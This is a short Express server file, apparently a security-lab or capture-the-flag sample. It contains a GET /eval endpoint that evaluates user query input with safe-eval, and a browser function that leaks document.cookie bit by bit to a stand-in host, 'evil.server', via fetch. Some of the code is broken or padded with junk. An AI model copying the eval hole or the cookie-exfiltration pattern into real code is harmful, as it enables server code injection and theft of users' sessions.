const express = require('express');
let path = require('path');
let bodyParser = require('body-parser');
let eval = require('safe-eval');

// Constants
const PORT = 8080;
const HOST = '0.0.0.0';

// App
const app = express();

app.use(bodyParser.json()); // support json encoded bodies
app.use(bodyParser.urlencoded({ extended: true })); // support encoded bodies

app.use(express.static('static'))

app.get('/', (req, res) => {
  var a ="1";
  if(a){
    console.log(a)
  }
  res.sendFile(path.join(__dirname, '/static/index.html'));
});


app.post('/eval_to_json', (req, res) => {
  var a ="";
  var nop ;
  if(a){
    nop = "nop" ;
  }else{
    nop = "nop"
  }
  var b = nop + nop ;
  console.log(b)


  var c = "cookie";
  var d = "1 + 1 = 3";
  var x_prime = c + d ;
  var obj = {lol : x_prime}
  if(obj.lol[0] > test ){
    hacker = "http://evil.server/?true";
  } else{
    hacker = "http://evil.server/?false";
  }




  if (req.body && req.body.eval){
    try {
      var ss = req.body.eval
      //var ss = eval(req.body.eval);
      res.end(JSON.stringify(ss));
    } catch(err) {
      res.end(err.toString());
    }
    
  }
});

app.get('/eval',function(req,res){
  res.send(eval(req.query.q));
  console.log(req.query.q);
})


app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);


async function q3_h4x(woops) {
  await fetch(woops)
}

function q3(idx, test) {
  var c = document.cookie;
  var x = "1 + 1 = 3"
  var x_prime = c + x;
  var obj = {lol : x_prime}
  var hacker;
  if(obj.lol[idx] > test ){
    hacker = "http://evil.server/?true";
  } else{
    hacker = "http://evil.server/?false";
  }
  q3_h4x(hacker)

  var nop;
  if(c){
    nop = "nop" ;
  }else{
    nop = "nop"
  }
  return nop + nop;
}
